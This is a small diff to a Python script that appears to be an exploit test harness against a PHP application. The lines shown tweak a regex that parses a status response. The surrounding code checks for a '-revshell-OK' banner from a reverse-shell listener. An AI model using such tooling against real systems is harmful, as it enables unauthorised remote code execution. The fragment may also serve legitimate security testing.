@@ -281,7 +281,7 @@ def run_once(host, port, rhost, rport, mode, cmd, n, up=None, serve=None, init=N
     resp3 = http(host, port, '/app.php?PHPSESSID=%s&pl=1' % sid, None)
     th.join(timeout=10)
     ls.close()
-    m = re.search(r'PLRUN FROZEN=(\d) BYTES=(\d+) CLEN=(\d+)', resp3 or '')
+    m = re.search(r'PLRUN FROZEN=(\d)(?: INFLIGHT=\d)? BYTES=(\d+) CLEN=(\d+)', resp3 or '')
     frozen = tuple(int(g) for g in m.groups()) if m else (-1, -1, -1)
     shell = bool(box) and '-revshell-OK' in box[0]
     return dict(ok=frozen[0] == 1, shell=shell, banner=(box[0] if box else ''),
